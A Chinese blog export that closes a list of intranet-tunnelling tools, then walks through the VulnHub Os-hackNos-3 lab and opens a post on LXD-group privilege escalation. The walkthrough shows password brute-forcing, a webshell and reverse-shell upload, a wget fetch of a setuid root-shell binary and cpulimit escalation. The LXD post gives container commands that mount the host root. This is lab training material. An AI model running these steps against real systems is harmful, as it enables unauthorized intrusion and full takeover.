<h3 id="Sunny-Ngrok"><a href="#Sunny-Ngrok" class="headerlink" title="Sunny-Ngrok"></a>Sunny-Ngrok</h3><p>Sunny-Ngrok同样是ngrok二次开发的内网穿透工具，支持http,https协议，同时支持更丰富的系统和语言：linux、win、mac、openwrt、 python、php等。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubmdyb2suY2Mv">Sunny-Ngrok官网<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cubmdyb2suY2MvX2Jvb2sv">Sunny-Ngrok使用教程<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="echosite"><a href="#echosite" class="headerlink" title="echosite"></a>echosite</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZWNob3NpdGUuY24v">echosite官网<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ludGVyZXN0aW5nMDMwMy9hcnRpY2xlL2RldGFpbHMvODEwOTg2MDM=">EchoSite—让内网穿透变得简单<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="autossh"><a href="#autossh" class="headerlink" title="autossh"></a>autossh</h3><p>ssh 配合autossh工具使用，因为autossh会容错，自动重新启动SSH会话和隧道。autossh是一个程序，用于启动ssh的副本并进行监控，在死亡或停止传输流量时根据需要重新启动它。 这个想法来自rstunnel（Reliable SSH Tunnel），但是在C中实现。作者的观点是，它不像匆匆忙忙的工作那么容易。使用端口转发环路或远程回显服务进行连接监视。在遇到连接拒绝等快速故障时，关闭连接尝试的速度。在OpenBSD，Linux，Solaris，Mac OS X，Cygwin和AIX上编译和测试; 应该在其他BSD上工作。免费软件。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFyZGluZy5tb3RkLmNhL2F1dG9zc2gv">autossh 官网<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly95YW5ncWlhbmcuaW0vP3A9Njk4">SSH内网穿透<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="Lanproxy"><a href="#Lanproxy" class="headerlink" title="Lanproxy"></a>Lanproxy</h3><p>lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面…）。目前市面上提供类似服务的有花生壳、TeamView、GoToMyCloud等等，但要使用第三方的公网服务器就必须为第三方付费，并且这些服务都有各种各样的限制，此外，由于数据包会流经第三方，因此对数据安全也是一大隐患。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZmYXkvbGFucHJveHk=">Lanproxy github<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="spike"><a href="#spike" class="headerlink" title="spike"></a>spike</h3><p>Spike is a fast reverse proxy built on top of ReactPHP that helps to expose your local services to the internet.</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NsaW5jZS9zcGlrZQ==">spike github<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL3EvMTAxMDAwMDAwOTk1NTcwMg==">使用 PHP 实现的的内网穿透工具 “Spike”<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="FCN"><a href="#FCN" class="headerlink" title="FCN"></a>FCN</h3><p>FCN[free connect]是一款傻瓜式的一键接入私有网络的工具, fcn利用公共服务器以及数据加密技术实现：在免公网IP环境下，在任意联网机器上透明接入服务端所在局域网网段。支持多种系统，有免费版和付费版。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JveXdocC9mY24=">FCN github<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL3d3dy5zb2h1LmNvbS9hLzIwMjMzMTEzNV80NDk1NDg=">天涯若比邻，内网穿透工具FCN介绍<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="内网穿透在渗透测试中的使用（撸穿内网）"><a href="#内网穿透在渗透测试中的使用（撸穿内网）" class="headerlink" title="内网穿透在渗透测试中的使用（撸穿内网）"></a>内网穿透在渗透测试中的使用（撸穿内网）</h3><p><span class="exturl" data-url="aHR0cDovLzF5cHQwLnRvcC8yMDE4LzEyLzIyLyVFNSU4NiU4NSVFNyVCRCU5MSVFNiVCOCU5NyVFOSU4MCU4RiVFNCVCOCVBRCVFNyU5QSU4NCVFNyVBQiVBRiVFNSU4RiVBMyVFOCVCRCVBQyVFNSU4RiU5MS8=">内网渗透中的端口转发<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGV4dGVyaW5kdXN0cmllcy5jb20vaG93dG8vYWNjZXNzLXlvdXItcmFzcGJlcnJ5LXBpLWZyb20tb3V0c2lkZS15b3VyLWhvbWUtb3ItbG9jYWwtbmV0d29yay8=">Access Your Raspberry Pi From Outside Your Home or Local Network<i class="fa fa-external-link-alt"></i></span></p>
<h4 id="最后再次祝各位巨佬能够撸穿各种内网"><a href="#最后再次祝各位巨佬能够撸穿各种内网" class="headerlink" title="最后再次祝各位巨佬能够撸穿各种内网!!!!!!!"></a>最后再次祝各位巨佬能够撸穿各种内网!!!!!!!</h4>]]></content>
      <categories>
        <category>intranet penetration</category>
      </categories>
      <tags>
        <tag>intranet penetration</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Os-hackNos-3]</title>
    <url>/2019/12/31/Os-hackNos-3/</url>
    <content><![CDATA[<p>(如果看不到图片，是因为github图床被墙了，准备梯子或者等一段时间就能看到图片了。)</p>
<h3 id="发布日期"><a href="#发布日期" class="headerlink" title="发布日期"></a>发布日期</h3><p>名称：hackNos：Os-hackNos-3<br>发布日期：2019年12月14日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MXpXVFU2QkZYUG1TOEJEZW9WYzc2NkZ3VUpRWjQtX1JU">https://drive.google.com/open?id=1zWTU6BFXPmS8BDeoVc766FwUJQZ4-_RT<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbm9zL09zLWhhY2tOb3MtMy5vdmE=">https://download.vulnhub.com/hacknos/Os-hackNos-3.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbm9zL09zLWhhY2tOb3MtMy5vdmEudG9ycmVudA==">https://download.vulnhub.com/hacknos/Os-hackNos-3.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>难度：中级<br>flag：2flag第一个user.txt和第二个root.txt<br>学习：Web应用程序 枚举 特权提升<br>网站：<span class="exturl" data-url="aHR0cDovL3d3dy5oYWNrbm9zLmNvbS8=">www.hacknos.com<i class="fa fa-external-link-alt"></i></span><br>联系我们：@rahul_gehlaut<br>使用VirtualBox而不是VMware可能会更好</p>
<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>我想起来做这个靶机的原因是，暗月大佬说他自己搜遍全网无法提权，本人就苟且尝试着做了一下。。。:)</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub102.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub103.jpg"></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.105</span><br><span class="line">Host is up (0.00022s latency).</span><br><span class="line">MAC Address: 08:00:27:CF:65:22 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -v -sV -Pn 192.168.56.105</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 22,80 -Pn -sV -A -T5 -v --script=vuln 192.168.56.105</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /scripts/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.41 (ubuntu)&#x27;</span></span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br></pre></td></tr></table></figure>

<p>没有太多有用信息，/scripts/目录下的文件显示是osticket搭建的邮件系统,dirb没有发现太多有效信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.105/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon Dec 30 21:46:55 2019</span><br><span class="line">URL_BASE: http://192.168.56.105/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.105/ ----</span><br><span class="line">+ http://192.168.56.105/index.html (CODE:200|SIZE:195)                                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.105/scripts/                                                         </span><br><span class="line">+ http://192.168.56.105/server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure>

<p>现在就上神器dirbuster了<br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub104.jpg"></p>
<p>电脑性能好，开500个线程无压力:)</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub105.jpg"></p>
<p>发现两个敏感目录/websec, /devil其中只有/websec目录下的cms有用</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub106.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub107.jpg"></p>
<h3 id="爆破cms的后台密码"><a href="#爆破cms的后台密码" class="headerlink" title="爆破cms的后台密码"></a>爆破cms的后台密码</h3><p>使用cewl爬取/websec/页面制作密码字典（靶机作者的提示）</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub108.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cewl http://192.168.56.105/websec/ &gt; oshacknos3.txt</span></span><br><span class="line">root@kali:~<span class="comment"># cat oshacknos3.txt </span></span><br><span class="line">CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line">hackNos</span><br><span class="line">Bootstrap</span><br><span class="line">and</span><br><span class="line">com</span><br><span class="line">Start</span><br><span class="line">www</span><br><span class="line">JavaScript</span><br><span class="line">Navigation</span><br><span class="line">About</span><br><span class="line">Services</span><br><span class="line">Portfolio</span><br><span class="line">Contact</span><br><span class="line">Security</span><br><span class="line">Find</span><br><span class="line">Out</span><br><span class="line">More</span><br><span class="line">Securityx</span><br><span class="line">has</span><br><span class="line">everything</span><br><span class="line">you</span><br><span class="line">need</span><br><span class="line">get</span><br><span class="line">your</span><br><span class="line">new</span><br><span class="line">website</span><br><span class="line">running</span><br><span class="line">time</span><br><span class="line">All</span><br><span class="line">the</span><br><span class="line">templates</span><br><span class="line">themes</span><br><span class="line">are</span><br><span class="line">open</span><br><span class="line"><span class="built_in">source</span></span><br><span class="line">free</span><br><span class="line">download</span><br><span class="line">easy</span><br><span class="line">use</span><br><span class="line">strings</span><br><span class="line">attached</span><br><span class="line">Get</span><br><span class="line">Started</span><br><span class="line">Your</span><br><span class="line">Service</span><br><span class="line">contact</span><br><span class="line">hacknos</span><br><span class="line">core</span><br><span class="line">Plugin</span><br><span class="line">Custom</span><br><span class="line">scripts</span><br><span class="line"><span class="keyword">for</span></span><br><span class="line">this</span><br><span class="line">template</span><br></pre></td></tr></table></figure>

<p>用户名用<span class="exturl" data-url="bWFpbHRvOiYjOTk7JiN4NmY7JiMxMTA7JiMxMTY7JiM5NzsmI3g2MzsmIzExNjsmIzY0OyYjMTA0OyYjOTc7JiM5OTsmI3g2YjsmIzExMDsmIzExMTsmI3g3MzsmI3gyZTsmI3g2MzsmIzExMTsmIzEwOTs=">&#99;&#x6f;&#110;&#116;&#97;&#x63;&#116;&#64;&#104;&#97;&#99;&#x6b;&#110;&#111;&#x73;&#x2e;&#x63;&#111;&#109;<i class="fa fa-external-link-alt"></i></span>，爆破密码用hydra或者burp都可以，成功进入后台后，发现密码就是首页的Securityx</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub109.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub110.jpg"></p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>进入下图所示页面然后点开.htaccess文件，将里面的内容全部删除，然后点击save，不删除的话，后面上传的shell无法访问。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub111.jpg"></p>
<p>如下图成功上传冰蝎木马</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub112.jpg"></p>
<p>直接连接然后上传php-reverse-shell.php,</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub113.jpg"></p>
<p>kali端监听，然后访问shell，成功弹回shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.105: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.105] 53620</span><br><span class="line">Linux hacknos 5.3.0-24-generic <span class="comment">#26-Ubuntu SMP Thu Nov 14 01:33:18 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 03:34:52 up  2:04,  0 users,  load average: 0.00, 0.00, 0.33</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id </span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ python3 -c &#x27;</span>import pty;pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">www-data@hacknos:/$ id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">www-data@hacknos:/$ whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>话说暗月大佬搜全网都无法提权的靶机，本人感到非常好奇，到底有多难呢？请接着往下看。</p>
<p>查看SUID权限可执行文件，没有可用的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hacknos:/$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/cpulimit</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/chsh</span><br></pre></td></tr></table></figure>

<p>上<span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v">gtfobins<i class="fa fa-external-link-alt"></i></span>搜索了以下可利用提权的cpulimit二进制文件.</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub114.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hacknos:/$ sudo cpulimit -l 100 -f /bin/sh</span><br><span class="line">sudo cpulimit -l 100 -f /bin/sh</span><br><span class="line">[sudo] password <span class="keyword">for</span> www-data:</span><br></pre></td></tr></table></figure>

<p>失败。。。然后尝试了各种exp和poc和脚本，还有其他提权方式均失败之后，实在没办法找到了作者，问了作者</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub115.jpg"></p>
<p>作者的意思是通过docker提权，参考他的博客<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja25vcy5jb20vZG9ja2VyLXByaXZpbGVnZS1lc2NhbGF0aW9uLw==">docker Privilege Escalation Linux<i class="fa fa-external-link-alt"></i></span>。</p>
<p>然而，我按照文中的方法试了，还是提示当前用户www-data的权限不足,然后查看了blackdevil用户的权限，具有docker的权限</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub116.jpg"></p>
<p>然而，后面我花了很多时间尝试爆破blackdevil的密码，尝试在shell中找hash值，无果。。。再次问作者，也没有回复。</p>
<p>所以只好在discord上面询问vulnhub的大神,有幸得到了pwn4magic大佬的回复</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub117.jpg"></p>
<p>他告诉我先在kali上面写好C语言的脚本，然后编译，然后将生成的程序放到目标机上面给777权限，然后和cpulimit一起运行就行了，具体做法如下。</p>
<p>c语言程序源码:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;sys/types.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  setuid(0);</span><br><span class="line">  setgid(0);</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译之后，放到目标机上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># gcc luci11.c -o exp</span></span><br><span class="line">luci11.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">luci11.c:9:3: warning: implicit declaration of <span class="keyword">function</span> ‘system’ [-Wimplicit-function-declaration]</span><br><span class="line">    9 |   system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">      |   ^~~~~~</span><br><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hacknos:/tmp$ wget http://192.168.56.102:8000/exp</span><br><span class="line">wget http://192.168.56.102:8000/exp</span><br><span class="line">--2019-12-31 05:37:05--  http://192.168.56.102:8000/exp</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 16720 (16K) [application/octet-stream]</span><br><span class="line">Saving to: ‘exp’</span><br><span class="line"></span><br><span class="line">exp                 100%[===================&gt;]  16.33K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2019-12-31 05:37:05 (130 MB/s) - ‘exp’ saved [16720/16720]</span><br><span class="line"></span><br><span class="line">www-data@hacknos:/tmp$ chmod 777 exp</span><br><span class="line">chmod 777 exp</span><br><span class="line">www-data@hacknos:/tmp$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwxrwxrwt  2 root     root      4096 Dec 31 05:37 .</span><br><span class="line">drwxr-xr-x 20 root     root      4096 Dec 10 18:05 ..</span><br><span class="line">-rwxrwxrwx  1 www-data www-data 16720 Dec 31  2019 exp</span><br></pre></td></tr></table></figure>

<p>最后运行下面命令提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hacknos:/tmp$ cpulimit -l 100 -f ./exp</span><br><span class="line">cpulimit -l 100 -f ./exp</span><br><span class="line">Process 2800 detected</span><br><span class="line">root@hacknos:/tmp<span class="comment"># id </span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br><span class="line">root@hacknos:/tmp<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>成功提权，简直帅炸天。。。<br>得到flag,root.txt。。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@hacknos:/tmp<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@hacknos:/root<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">root.txt  snap</span><br><span class="line">root@hacknos:/root<span class="comment"># cat root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line"><span class="comment">########    #####     #####   ########         ########  </span></span><br><span class="line"><span class="comment">##     ##  ##   ##   ##   ##     ##            ##     ## </span></span><br><span class="line"><span class="comment">##     ## ##     ## ##     ##    ##            ##     ## </span></span><br><span class="line"><span class="comment">########  ##     ## ##     ##    ##            ########  </span></span><br><span class="line"><span class="comment">##   ##   ##     ## ##     ##    ##            ##   ##   </span></span><br><span class="line"><span class="comment">##    ##   ##   ##   ##   ##     ##            ##    ##  </span></span><br><span class="line"><span class="comment">##     ##   #####     #####      ##    ####### ##     ##</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MD5-HASH: bae11ce4f67af91fa58576c1da2aad4b</span><br><span class="line"></span><br><span class="line">Author: Rahul Gehlaut</span><br><span class="line"></span><br><span class="line">Blog: www.hackNos.com</span><br><span class="line"></span><br><span class="line">Linkedin: https://in.linkedin.com/<span class="keyword">in</span>/rahulgehlaut</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub118.jpg"></p>
<p>至此，挑战完成。。。<br>全网首发，发布日期（2019年12月31）</p>
<ul>
<li><p>eg: linux suid提权参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL2xpbnV4LXByaXZpbGVnZS1lc2NhbGF0aW9uLXVzaW5nLXN1aWQtYmluYXJpZXMv">Linux Privilege Escalation using SUID Binaries<i class="fa fa-external-link-alt"></i></span>，保姆级教程。</p>
</li>
<li><p>最后附上oshacknos3靶机作者Rahul Gehlaut的write up<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja25vcy5jb20vb3MtaGFja25vcy0zLXdhbGt0aHJvdWdoLXZ1bG5odWItY3RmLw==">OS-hackNos-3 Walkthrough Vulnhub CTF<i class="fa fa-external-link-alt"></i></span>，其实能进入blackdevil账户的话，还可以使用之前文章中提到的docker提权方式。</p>
</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>lxd容器提权</title>
    <url>/2020/01/20/Privilege-Escalation-via-lxd/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>LXD是Ubuntu的使用linux容器的容器管理器。可以认为它与docker在同一领域内发挥作用，</p>
<p>应该将lxd组视为与<span class="exturl" data-url="aHR0cHM6Ly93d3cuem9weXguZGUvYW5kcmVhcy1qdW5nL2NvbnRlbnRzL29uLWRvY2tlci1zZWN1cml0eS1kb2NrZXItZ3JvdXAtY29uc2lkZXJlZC1oYXJtZnVs">docker<i class="fa fa-external-link-alt"></i></span>组危害方式相同。在任何情况下，都不应授予本地容器中的用户访问lxd组的权限。这是因为要利用它完全是微不足道的。</p>
<p>首先，检查用户是否是该组的成员，因为如果安装了它并且是sudoer，则很可能是安装后，lxd会自动将每个用户添加到lxd组中。考虑到sudoer自动具有root用户访问权限，这可能被认为是可以的，但它忘记了sudo具有适当的审核功能，并且确实需要密码来执行root用户所需的任何操作。实际上，仅安装lxd等效于在sudoers文件中添加以下内容。</p>
<a id="more"></a>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">admin    ALL=NOPASSWD: ALL</span><br></pre></td></tr></table></figure>

<p>如果某人获得了对管理员帐户的访问权限，那么他们将立即获得完全的root访问权限，而无需输入密码。考虑一个逃避到外的ssh私钥或在该用户下运行的过时服务，突然之间，一个仍然没有破解管理员帐户密码的攻击者就具有完全的root用户访问权限，这都是因为您安装了lxd。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /etc/passwd | grep 1000 </span><br><span class="line">ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash </span><br><span class="line">ubuntu@ubuntu:~$ cat /etc/group | grep ubuntu </span><br><span class="line">adm:x:4:syslog,ubuntu </span><br><span class="line">cdrom:x:24:ubuntu </span><br><span class="line">sudo:x:27:ubuntu </span><br><span class="line">dip:x:30:ubuntu </span><br><span class="line">plugdev:x:46:ubuntu </span><br><span class="line">lpadmin:x:113:ubuntu </span><br><span class="line">ubuntu:x:1000: </span><br><span class="line">sambashare:x:128:ubuntu </span><br><span class="line">ubuntu@ubuntu:~$ sudo su </span><br><span class="line">[sudo] password <span class="keyword">for</span> ubuntu:  </span><br><span class="line">root@ubuntu:/home/ubuntu<span class="comment"># apt-get install lxd </span></span><br><span class="line">----SNIP----</span><br><span class="line">root@ubuntu:/home/ubuntu<span class="comment"># cat /etc/passwd | grep 1000 </span></span><br><span class="line">ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash </span><br><span class="line">root@ubuntu:/home/ubuntu<span class="comment"># cat /etc/group | grep ubuntu </span></span><br><span class="line">adm:x:4:syslog,ubuntu </span><br><span class="line">cdrom:x:24:ubuntu </span><br><span class="line">sudo:x:27:ubuntu </span><br><span class="line">dip:x:30:ubuntu </span><br><span class="line">plugdev:x:46:ubuntu </span><br><span class="line">lpadmin:x:113:ubuntu </span><br><span class="line">ubuntu:x:1000: </span><br><span class="line">sambashare:x:128:ubuntu </span><br><span class="line">lxd:x:129:ubuntu </span><br></pre></td></tr></table></figure>

<p>并不是在反对lxd组的存在，只是在不通知用户的情况下增加了攻击面。发现这归结于用户没有意识到该组赋予其帐户的功能，并且尽管删除了sudo特权，但没有进行lxd访问。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因此，我非常想了解安全风险，但让我们看看实际情况。只因为<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x4Yy9seGQvaXNzdWVzLzIwMDM=">2003<i class="fa fa-external-link-alt"></i></span>而发现了这一点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lxc init ubuntu:16.04 <span class="built_in">test</span> -c security.privileged=<span class="literal">true</span> </span><br><span class="line">Creating <span class="built_in">test</span> </span><br><span class="line">ubuntu@ubuntu:~$ lxc config device add <span class="built_in">test</span> whatever disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span> </span><br><span class="line">Device whatever added to <span class="built_in">test</span> </span><br><span class="line">ubuntu@ubuntu:~$ lxc start <span class="built_in">test</span> </span><br><span class="line">ubuntu@ubuntu:~$ lxc <span class="built_in">exec</span> <span class="built_in">test</span> bash </span><br></pre></td></tr></table></figure>

